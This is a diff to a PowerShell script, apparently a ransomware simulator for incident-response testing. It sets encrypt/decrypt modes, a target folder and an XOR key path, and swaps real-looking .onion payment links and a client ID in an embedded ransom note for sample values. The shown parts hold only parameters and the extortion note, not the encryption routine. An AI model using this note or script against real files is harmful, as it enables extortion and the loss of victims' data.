@@ -1,7 +1,10 @@
+# (-Mode encrypt) (-Mode decrypt)
+# set target folder and key file path
+
 param (
     [string]$Mode,  # Accepts "-encrypt" or "-decrypt"
-    [string]$TargetFolder = "C:\Users\IR3\Downloads\Test_Chirag_Ransomware_Simulator\Test_Chirag_Ransomware_Simulator",  # Change to target folder
-    [string]$KeyFile = "C:\Users\IR3\Downloads\key\encryption.key"  # Location of the XOR key
+    [string]$TargetFolder = "C:\Usersr",  # Change to target folder
+    [string]$KeyFile = "C:\Users\sample\encryption.key"  # Location of the XOR key
 )
 
 # Check for valid mode
@@ -66,8 +69,8 @@ Good news:
 
 FAQs:
 Who we are?
-- Normal Browser Links: https://zetadobynonjctkxxvap77yqifu2emfbecgbqzeta.onion.ly/
-- Tor Browser Links: http://zetabynonjctkxxvap77yqifu2emfbecgbqzeta.onion/
+- Normal Browser Links: https://samplezetaras.onion.ly/
+- Tor Browser Links: http://smplezetaqzeta.onion/
 
 Think you can decrypt files yourself? Don't even try.
 
@@ -80,8 +83,8 @@ What do we offer in exchange on your payment:
 
 Now, in order to start negotiations, you need to:
 - install and run 'Tor Browser' from https://www.torproject.org/download/
-- use 'Tor Browser' open http://zetaqoin2zhzmshtbmut2wovrkdy7yymiypkmtcow4fr5zeta.onion/
-- enter your Client ID: 79abde4befy82c2eba5ea60c29250
+- use 'Tor Browser' open http://zetaqoin2zhzmsh4fr5zeta.onion/
+- enter your Client ID: 79abdetestrandom29250
 
 There will be no bad news after successful negotiations. But if you refuse, your business will suffer.
 
